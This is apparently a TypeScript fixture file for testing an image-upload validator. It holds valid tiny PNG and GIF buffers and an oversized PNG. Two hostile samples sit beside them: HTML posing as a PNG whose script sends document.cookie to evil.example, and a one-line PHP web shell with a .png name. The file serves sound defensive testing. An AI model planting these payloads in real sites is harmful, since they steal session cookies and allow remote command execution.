/**
 * Test fixtures built in memory, so the repository carries no binary blobs.
 */

/** A real, valid 1x1 transparent PNG. */
export const PNG_1X1 = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
  'base64',
)

/** A real, valid 1x1 GIF. */
export const GIF_1X1 = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64')

/**
 * The attack: HTML that will be uploaded as `logo.png` with
 * `Content-Type: image/png`. Both the name and the declared type are lies; only
 * the bytes tell the truth.
 */
export const HTML_PRETENDING_TO_BE_PNG = Buffer.from(
  '<!doctype html>\n<script>fetch("https://evil.example/?c="+document.cookie)</script>\n',
  'utf8',
)

/** A polyglot-ish attempt: a PHP tag with a .png name and image/png declared. */
export const PHP_PRETENDING_TO_BE_PNG = Buffer.from('<?php system($_GET["c"]); ?>\n', 'utf8')

/** Bigger than the 2 MiB fileSize limit. Valid PNG header, then padding. */
export function oversizedPng(bytes = 3 * 1024 * 1024) {
  return Buffer.concat([PNG_1X1, Buffer.alloc(bytes - PNG_1X1.length, 0x41)])
}
